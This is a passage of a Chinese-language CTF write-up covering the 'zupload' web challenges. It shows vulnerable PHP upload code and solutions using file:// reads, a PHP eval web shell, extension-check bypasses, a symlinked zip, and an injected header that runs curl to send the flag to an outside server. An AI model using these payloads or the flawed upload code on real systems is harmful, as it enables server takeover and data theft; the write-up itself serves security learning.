+<a id="__codelineno-21-12" name="__codelineno-21-12"></a><a href="#__codelineno-21-12"><span class="linenos" data-linenos="12 "></span></a>        <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Not implemented yet&#39;</span>
+<a id="__codelineno-21-13" name="__codelineno-21-13"></a><a href="#__codelineno-21-13"><span class="linenos" data-linenos="13 "></span></a>    <span class="p">));</span>
+<a id="__codelineno-21-14" name="__codelineno-21-14"></a><a href="#__codelineno-21-14"><span class="linenos" data-linenos="14 "></span></a><span class="p">}</span>
+</code></pre></div>
+<h5 id="_17">解题过程</h5>
+<p>file_get_contents 能直接读取文件
+payload：<code>?action=file:///flag</code></p>
+<h3 id="zupload-pro">zupload-pro</h3>
+<h5 id="_18">题目</h5>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1"></a><a href="#__codelineno-22-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2"></a><a href="#__codelineno-22-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3"></a><a href="#__codelineno-22-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4"></a><a href="#__codelineno-22-4"><span class="linenos" data-linenos=" 4 "></span></a>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<a id="__codelineno-22-5" name="__codelineno-22-5"></a><a href="#__codelineno-22-5"><span class="linenos" data-linenos=" 5 "></span></a>        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: /?action=upload&#39;</span><span class="p">);</span>
+<a id="__codelineno-22-6" name="__codelineno-22-6"></a><a href="#__codelineno-22-6"><span class="linenos" data-linenos=" 6 "></span></a>        <span class="k">die</span><span class="p">();</span>
+<a id="__codelineno-22-7" name="__codelineno-22-7"></a><a href="#__codelineno-22-7"><span class="linenos" data-linenos=" 7 "></span></a>    <span class="p">}</span>
+<a id="__codelineno-22-8" name="__codelineno-22-8"></a><a href="#__codelineno-22-8"><span class="linenos" data-linenos=" 8 "></span></a>    <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;/&#39;</span> <span class="o">||</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">],</span> <span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-22-9" name="__codelineno-22-9"></a><a href="#__codelineno-22-9"><span class="linenos" data-linenos=" 9 "></span></a>        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;h1&gt;Invalid action&lt;/h1&gt;&#39;</span><span class="p">);</span>
+<a id="__codelineno-22-10" name="__codelineno-22-10"></a><a href="#__codelineno-22-10"><span class="linenos" data-linenos="10 "></span></a>    <span class="p">}</span>
+<a id="__codelineno-22-11" name="__codelineno-22-11"></a><a href="#__codelineno-22-11"><span class="linenos" data-linenos="11 "></span></a>    <span class="k">die</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]));</span>
+<a id="__codelineno-22-12" name="__codelineno-22-12"></a><a href="#__codelineno-22-12"><span class="linenos" data-linenos="12 "></span></a><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-22-13" name="__codelineno-22-13"></a><a href="#__codelineno-22-13"><span class="linenos" data-linenos="13 "></span></a>    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+<a id="__codelineno-22-14" name="__codelineno-22-14"></a><a href="#__codelineno-22-14"><span class="linenos" data-linenos="14 "></span></a>    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+<a id="__codelineno-22-15" name="__codelineno-22-15"></a><a href="#__codelineno-22-15"><span class="linenos" data-linenos="15 "></span></a>    <span class="nv">$file_tmp</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+<a id="__codelineno-22-16" name="__codelineno-22-16"></a><a href="#__codelineno-22-16"><span class="linenos" data-linenos="16 "></span></a>    <span class="nv">$file_size</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">];</span>
+<a id="__codelineno-22-17" name="__codelineno-22-17"></a><a href="#__codelineno-22-17"><span class="linenos" data-linenos="17 "></span></a>    <span class="nv">$file_error</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;error&#39;</span><span class="p">];</span>
+<a id="__codelineno-22-18" name="__codelineno-22-18"></a><a href="#__codelineno-22-18"><span class="linenos" data-linenos="18 "></span></a>
+<a id="__codelineno-22-19" name="__codelineno-22-19"></a><a href="#__codelineno-22-19"><span class="linenos" data-linenos="19 "></span></a>    <span class="k">if</span> <span class="p">(</span><span class="nv">$file_error</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-22-20" name="__codelineno-22-20"></a><a href="#__codelineno-22-20"><span class="linenos" data-linenos="20 "></span></a>        <span class="k">if</span> <span class="p">(</span><span class="nv">$file_size</span> <span class="o">&lt;=</span> <span class="mi">2097152</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-22-21" name="__codelineno-22-21"></a><a href="#__codelineno-22-21"><span class="linenos" data-linenos="21 "></span></a>            <span class="nv">$file_destination</span> <span class="o">=</span> <span class="s1">&#39;uploads/&#39;</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span>
+<a id="__codelineno-22-22" name="__codelineno-22-22"></a><a href="#__codelineno-22-22"><span class="linenos" data-linenos="22 "></span></a>
+<a id="__codelineno-22-23" name="__codelineno-22-23"></a><a href="#__codelineno-22-23"><span class="linenos" data-linenos="23 "></span></a>            <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$file_tmp</span><span class="p">,</span> <span class="nv">$file_destination</span><span class="p">))</span> <span class="p">{</span>
+<a id="__codelineno-22-24" name="__codelineno-22-24"></a><a href="#__codelineno-22-24"><span class="linenos" data-linenos="24 "></span></a>                <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+<a id="__codelineno-22-25" name="__codelineno-22-25"></a><a href="#__codelineno-22-25"><span class="linenos" data-linenos="25 "></span></a>                    <span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;ok&#39;</span><span class="p">,</span>
+<a id="__codelineno-22-26" name="__codelineno-22-26"></a><a href="#__codelineno-22-26"><span class="linenos" data-linenos="26 "></span></a>                    <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;File uploaded successfully&#39;</span><span class="p">,</span>
+<a id="__codelineno-22-27" name="__codelineno-22-27"></a><a href="#__codelineno-22-27"><span class="linenos" data-linenos="27 "></span></a>                    <span class="s1">&#39;url&#39;</span> <span class="o">=&gt;</span> <span class="nb">preg_split</span><span class="p">(</span><span class="s1">&#39;/\?/&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$file_destination</span>
+<a id="__codelineno-22-28" name="__codelineno-22-28"></a><a href="#__codelineno-22-28"><span class="linenos" data-linenos="28 "></span></a>                <span class="p">));</span>
+<a id="__codelineno-22-29" name="__codelineno-22-29"></a><a href="#__codelineno-22-29"><span class="linenos" data-linenos="29 "></span></a>            <span class="p">}</span>
+<a id="__codelineno-22-30" name="__codelineno-22-30"></a><a href="#__codelineno-22-30"><span class="linenos" data-linenos="30 "></span></a>        <span class="p">}</span>
+<a id="__codelineno-22-31" name="__codelineno-22-31"></a><a href="#__codelineno-22-31"><span class="linenos" data-linenos="31 "></span></a>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<a id="__codelineno-22-32" name="__codelineno-22-32"></a><a href="#__codelineno-22-32"><span class="linenos" data-linenos="32 "></span></a>        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+<a id="__codelineno-22-33" name="__codelineno-22-33"></a><a href="#__codelineno-22-33"><span class="linenos" data-linenos="33 "></span></a>            <span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;error&#39;</span><span class="p">,</span>
+<a id="__codelineno-22-34" name="__codelineno-22-34"></a><a href="#__codelineno-22-34"><span class="linenos" data-linenos="34 "></span></a>            <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;File upload failed&#39;</span>
+<a id="__codelineno-22-35" name="__codelineno-22-35"></a><a href="#__codelineno-22-35"><span class="linenos" data-linenos="35 "></span></a>        <span class="p">));</span>
+<a id="__codelineno-22-36" name="__codelineno-22-36"></a><a href="#__codelineno-22-36"><span class="linenos" data-linenos="36 "></span></a>    <span class="p">}</span>
+<a id="__codelineno-22-37" name="__codelineno-22-37"></a><a href="#__codelineno-22-37"><span class="linenos" data-linenos="37 "></span></a><span class="p">}</span>
+</code></pre></div>
+<h5 id="_19">解题过程</h5>
+<p>file_get_contents 能直接读取文件
+payload：<code>?action=file:///flag</code></p>
+<p>file_get_contents 能直接读取文件
+加了限制，但没啥用
+<code>($_GET['action'][0] === '/' || strpos($_GET['action'], '..') !== false)</code>
+如果参数 action 的第一个字符是斜杠 (/) 或者参数中包含双点 (..)，则条件成立</p>
+<p>payload：<code>?action=file:///flag</code></p>
+<h3 id="zupload-pro-plus">zupload-pro-plus</h3>
+<h5 id="_20">题目</h5>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1"></a><a href="#__codelineno-23-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2"></a><a href="#__codelineno-23-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3"></a><a href="#__codelineno-23-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-23-4" name="__codelineno-23-4"></a><a href="#__codelineno-23-4"><span class="linenos" data-linenos=" 4 "></span></a>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<a id="__codelineno-23-5" name="__codelineno-23-5"></a><a href="#__codelineno-23-5"><span class="linenos" data-linenos=" 5 "></span></a>        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: /?action=upload&#39;</span><span class="p">);</span>
+<a id="__codelineno-23-6" name="__codelineno-23-6"></a><a href="#__codelineno-23-6"><span class="linenos" data-linenos=" 6 "></span></a>        <span class="k">die</span><span class="p">();</span>
+<a id="__codelineno-23-7" name="__codelineno-23-7"></a><a href="#__codelineno-23-7"><span class="linenos" data-linenos=" 7 "></span></a>    <span class="p">}</span>
+<a id="__codelineno-23-8" name="__codelineno-23-8"></a><a href="#__codelineno-23-8"><span class="linenos" data-linenos=" 8 "></span></a>    <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;/&#39;</span> <span class="o">||</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">],</span> <span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-23-9" name="__codelineno-23-9"></a><a href="#__codelineno-23-9"><span class="linenos" data-linenos=" 9 "></span></a>        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;h1&gt;Invalid action&lt;/h1&gt;&#39;</span><span class="p">);</span>
+<a id="__codelineno-23-10" name="__codelineno-23-10"></a><a href="#__codelineno-23-10"><span class="linenos" data-linenos="10 "></span></a>    <span class="p">}</span>
+<a id="__codelineno-23-11" name="__codelineno-23-11"></a><a href="#__codelineno-23-11"><span class="linenos" data-linenos="11 "></span></a>    <span class="k">die</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]));</span>
+<a id="__codelineno-23-12" name="__codelineno-23-12"></a><a href="#__codelineno-23-12"><span class="linenos" data-linenos="12 "></span></a><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-23-13" name="__codelineno-23-13"></a><a href="#__codelineno-23-13"><span class="linenos" data-linenos="13 "></span></a>    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+<a id="__codelineno-23-14" name="__codelineno-23-14"></a><a href="#__codelineno-23-14"><span class="linenos" data-linenos="14 "></span></a>    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+<a id="__codelineno-23-15" name="__codelineno-23-15"></a><a href="#__codelineno-23-15"><span class="linenos" data-linenos="15 "></span></a>    <span class="nv">$file_tmp</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+<a id="__codelineno-23-16" name="__codelineno-23-16"></a><a href="#__codelineno-23-16"><span class="linenos" data-linenos="16 "></span></a>    <span class="nv">$file_size</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">];</span>
+<a id="__codelineno-23-17" name="__codelineno-23-17"></a><a href="#__codelineno-23-17"><span class="linenos" data-linenos="17 "></span></a>    <span class="nv">$file_error</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;error&#39;</span><span class="p">];</span>
+<a id="__codelineno-23-18" name="__codelineno-23-18"></a><a href="#__codelineno-23-18"><span class="linenos" data-linenos="18 "></span></a>
+<a id="__codelineno-23-19" name="__codelineno-23-19"></a><a href="#__codelineno-23-19"><span class="linenos" data-linenos="19 "></span></a>    <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$file_name</span><span class="p">);</span>
+<a id="__codelineno-23-20" name="__codelineno-23-20"></a><a href="#__codelineno-23-20"><span class="linenos" data-linenos="20 "></span></a>    <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<a id="__codelineno-23-21" name="__codelineno-23-21"></a><a href="#__codelineno-23-21"><span class="linenos" data-linenos="21 "></span></a>
+<a id="__codelineno-23-22" name="__codelineno-23-22"></a><a href="#__codelineno-23-22"><span class="linenos" data-linenos="22 "></span></a>    <span class="nv">$allowed</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;zip&#39;</span><span class="p">);</span>
+<a id="__codelineno-23-23" name="__codelineno-23-23"></a><a href="#__codelineno-23-23"><span class="linenos" data-linenos="23 "></span></a>
+<a id="__codelineno-23-24" name="__codelineno-23-24"></a><a href="#__codelineno-23-24"><span class="linenos" data-linenos="24 "></span></a>    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$allowed</span><span class="p">))</span> <span class="p">{</span>
+<a id="__codelineno-23-25" name="__codelineno-23-25"></a><a href="#__codelineno-23-25"><span class="linenos" data-linenos="25 "></span></a>        <span class="k">if</span> <span class="p">(</span><span class="nv">$file_error</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-23-26" name="__codelineno-23-26"></a><a href="#__codelineno-23-26"><span class="linenos" data-linenos="26 "></span></a>            <span class="k">if</span> <span class="p">(</span><span class="nv">$file_size</span> <span class="o">&lt;=</span> <span class="mi">2097152</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-23-27" name="__codelineno-23-27"></a><a href="#__codelineno-23-27"><span class="linenos" data-linenos="27 "></span></a>                <span class="nv">$file_destination</span> <span class="o">=</span> <span class="s1">&#39;uploads/&#39;</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span>
+<a id="__codelineno-23-28" name="__codelineno-23-28"></a><a href="#__codelineno-23-28"><span class="linenos" data-linenos="28 "></span></a>
+<a id="__codelineno-23-29" name="__codelineno-23-29"></a><a href="#__codelineno-23-29"><span class="linenos" data-linenos="29 "></span></a>                <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$file_tmp</span><span class="p">,</span> <span class="nv">$file_destination</span><span class="p">))</span> <span class="p">{</span>
+<a id="__codelineno-23-30" name="__codelineno-23-30"></a><a href="#__codelineno-23-30"><span class="linenos" data-linenos="30 "></span></a>                    <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+<a id="__codelineno-23-31" name="__codelineno-23-31"></a><a href="#__codelineno-23-31"><span class="linenos" data-linenos="31 "></span></a>                        <span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;ok&#39;</span><span class="p">,</span>
+<a id="__codelineno-23-32" name="__codelineno-23-32"></a><a href="#__codelineno-23-32"><span class="linenos" data-linenos="32 "></span></a>                        <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;File uploaded successfully&#39;</span><span class="p">,</span>
+<a id="__codelineno-23-33" name="__codelineno-23-33"></a><a href="#__codelineno-23-33"><span class="linenos" data-linenos="33 "></span></a>                        <span class="s1">&#39;url&#39;</span> <span class="o">=&gt;</span> <span class="nb">preg_split</span><span class="p">(</span><span class="s1">&#39;/\?/&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$file_destination</span>
+<a id="__codelineno-23-34" name="__codelineno-23-34"></a><a href="#__codelineno-23-34"><span class="linenos" data-linenos="34 "></span></a>                    <span class="p">));</span>
+<a id="__codelineno-23-35" name="__codelineno-23-35"></a><a href="#__codelineno-23-35"><span class="linenos" data-linenos="35 "></span></a>                <span class="p">}</span>
+<a id="__codelineno-23-36" name="__codelineno-23-36"></a><a href="#__codelineno-23-36"><span class="linenos" data-linenos="36 "></span></a>            <span class="p">}</span>
+<a id="__codelineno-23-37" name="__codelineno-23-37"></a><a href="#__codelineno-23-37"><span class="linenos" data-linenos="37 "></span></a>        <span class="p">}</span>
+<a id="__codelineno-23-38" name="__codelineno-23-38"></a><a href="#__codelineno-23-38"><span class="linenos" data-linenos="38 "></span></a>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<a id="__codelineno-23-39" name="__codelineno-23-39"></a><a href="#__codelineno-23-39"><span class="linenos" data-linenos="39 "></span></a>        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+<a id="__codelineno-23-40" name="__codelineno-23-40"></a><a href="#__codelineno-23-40"><span class="linenos" data-linenos="40 "></span></a>            <span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;error&#39;</span><span class="p">,</span>
+<a id="__codelineno-23-41" name="__codelineno-23-41"></a><a href="#__codelineno-23-41"><span class="linenos" data-linenos="41 "></span></a>            <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Only zip files are allowed&#39;</span>
+<a id="__codelineno-23-42" name="__codelineno-23-42"></a><a href="#__codelineno-23-42"><span class="linenos" data-linenos="42 "></span></a>        <span class="p">));</span>
+<a id="__codelineno-23-43" name="__codelineno-23-43"></a><a href="#__codelineno-23-43"><span class="linenos" data-linenos="43 "></span></a>    <span class="p">}</span>
+<a id="__codelineno-23-44" name="__codelineno-23-44"></a><a href="#__codelineno-23-44"><span class="linenos" data-linenos="44 "></span></a><span class="p">}</span>
+</code></pre></div>
+<h5 id="_21">解题过程</h5>
+<p>file_get_contents 能直接读取文件
+加了限制，但没啥用
+<code>($_GET['action'][0] === '/' || strpos($_GET['action'], '..') !== false)</code>
+如果参数 action 的第一个字符是斜杠 (/) 或者参数中包含双点 (..)，则条件成立
+还加了个只能上传zip的限制，但没啥用</p>
+<p>payload：<code>?action=file:///flag</code></p>
+<h3 id="zupload-pro-plus-enhanced">zupload-pro-plus-enhanced</h3>
+<h5 id="_22">解题过程</h5>
+<p><code>($_GET['action'][0] === '/' || substr_count($_GET['action'], '/') &gt; 1)</code></p>
+<p>action 的第一个字符不能是斜杠 (/) 参数中只能有一个/ </p>
+<p>不能直接读取文件了</p>
+<p>查看代码
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1"></a><a href="#__codelineno-24-1"><span class="linenos" data-linenos="1 "></span></a><span class="x">    $file_ext = explode(&#39;.&#39;, $file_name);</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2"></a><a href="#__codelineno-24-2"><span class="linenos" data-linenos="2 "></span></a><span class="x">    $file_ext = strtolower($file_ext[1]);</span>
+<a id="__codelineno-24-3" name="__codelineno-24-3"></a><a href="#__codelineno-24-3"><span class="linenos" data-linenos="3 "></span></a>
+<a id="__codelineno-24-4" name="__codelineno-24-4"></a><a href="#__codelineno-24-4"><span class="linenos" data-linenos="4 "></span></a><span class="x">    $allowed = array(&#39;zip&#39;);</span>
+</code></pre></div>
+这里，只对文件名以点切割，第2段进行判断.可以上传一句话，文件名为shell.zip.php</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1"></a><a href="#__codelineno-25-1"><span class="linenos" data-linenos="1 "></span></a><span class="x">&lt;&lt;&lt;&lt;&lt;</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2"></a><a href="#__codelineno-25-2"><span class="linenos" data-linenos="2 "></span></a><span class="x">----</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3"></a><a href="#__codelineno-25-3"><span class="linenos" data-linenos="3 "></span></a><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span> <span class="p">(</span><span class="nv">$_REQUEST</span> <span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>有坑点的是这个有前端验证后缀（坑了我好久），</p>
+<p>访问/uploads/shell.zip.php?cmd=system('cat /f*');
+获得flag。</p>
+<h3 id="zupload-pro-plus-max">zupload-pro-plus-max</h3>
+<h5 id="_23">解题过程</h5>
+<p><code>($_GET['action'][0] === '/' || substr_count($_GET['action'], '/') &gt; 1)</code></p>
+<p>action 的第一个字符不能是斜杠 (/) 参数中只能有一个/ </p>
+<p>不能直接读取文件</p>
+<p>但是换成了<code>include($_GET['action'])</code></p>
+<p>查看代码
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1"></a><a href="#__codelineno-26-1"><span class="linenos" data-linenos="1 "></span></a><span class="x">    $file_ext = explode(&#39;.&#39;, $file_name);</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2"></a><a href="#__codelineno-26-2"><span class="linenos" data-linenos="2 "></span></a><span class="x">    $file_ext = strtolower(end($file_ext));</span>
+<a id="__codelineno-26-3" name="__codelineno-26-3"></a><a href="#__codelineno-26-3"><span class="linenos" data-linenos="3 "></span></a><span class="x">    $allowed = array(&#39;zip&#39;);</span>
+</code></pre></div>
+这里，只对文件名以点切割，判断最后一位.可以上传，文件名为shell.zip</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1"></a><a href="#__codelineno-27-1"><span class="linenos" data-linenos="1 "></span></a><span class="x">&lt;&lt;&lt;&lt;&lt;</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2"></a><a href="#__codelineno-27-2"><span class="linenos" data-linenos="2 "></span></a><span class="x">----</span>
+<a id="__codelineno-27-3" name="__codelineno-27-3"></a><a href="#__codelineno-27-3"><span class="linenos" data-linenos="3 "></span></a><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span> <span class="p">(</span><span class="nv">$_REQUEST</span> <span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>访问?action=uploads/shell.zip?cmd=system('cat /f*');</p>
+<p>获得flag。</p>
+<h3 id="zupload-pro-plus-max-ultra">zupload-pro-plus-max-ultra</h3>
+<h5 id="_24">解题过程</h5>
+<p>相比前面的代码，没什么漏洞，但是他添加了一个<code>exec('unzip ' . $file_tmp . ' -d ' . $extract_to);</code>
+其中<code>$extract_to</code> 是可以通过<code>$_SERVER['HTTP_X_EXTRACT_TO']</code> 控制</p>
+<p>只要在http的header中 添加
+X-Extract-To: | curl x.x.x.x/?flag=<code>cat /f*</code></p>
+<p>在vps中开启http服务监听80端口，请求靶机后，靶机将flag携带进入vps中，</p>
+<p>获得flag。</p>
+<h3 id="zupload-pro-plus-max-ultra-premium">zupload-pro-plus-max-ultra-premium</h3>
+<h5 id="_25">解题过程</h5>
+<p>前面的exec 也被封堵了
+唯一的变量也被escapeshellarg 了</p>
+<p>发现代码对文件进行了解压操作</p>
+<p>可以将软链接压缩，解压后还是软链接，访问文件，</p>
+<div class="language-shell highlight"><span class="filename">Bash</span><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1"></a><a href="#__codelineno-28-1"><span class="linenos" data-linenos="1 "></span></a>ln<span class="w"> </span>-s<span class="w"> </span>/flag<span class="w"> </span>f.txt
+<a id="__codelineno-28-2" name="__codelineno-28-2"></a><a href="#__codelineno-28-2"><span class="linenos" data-linenos="2 "></span></a>zip<span class="w"> </span>-ry<span class="w"> </span>shell.zip<span class="w"> </span>f.txt
+</code></pre></div>
+<p>将制作的shell.zip上传，
+下载/uploads/f.txt
+就能获得flag。</p>
+<h3 id="zupload-pro-revenge">zupload-pro-revenge</h3>
+<h5 id="_26">解题过程</h5>
+<p>file_get_contents 不能直接读取文件
+加了限制，
+<code>($_GET['action'][0] === '/' || substr_count($_GET['action'], '/') &gt; 1)</code></p>
+<p>但是没有对上传的文件进行限制</p>
+<p>可以上传一句话，文件名为shell.php</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1"></a><a href="#__codelineno-29-1"><span class="linenos" data-linenos="1 "></span></a><span class="x">&lt;&lt;&lt;&lt;&lt;</span>
+<a id="__codelineno-29-2" name="__codelineno-29-2"></a><a href="#__codelineno-29-2"><span class="linenos" data-linenos="2 "></span></a><span class="x">----</span>
+<a id="__codelineno-29-3" name="__codelineno-29-3"></a><a href="#__codelineno-29-3"><span class="linenos" data-linenos="3 "></span></a><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span> <span class="p">(</span><span class="nv">$_REQUEST</span> <span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>访问/uploads/shell.php?cmd=system('cat /f*');</p>
+<p>获得flag。</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
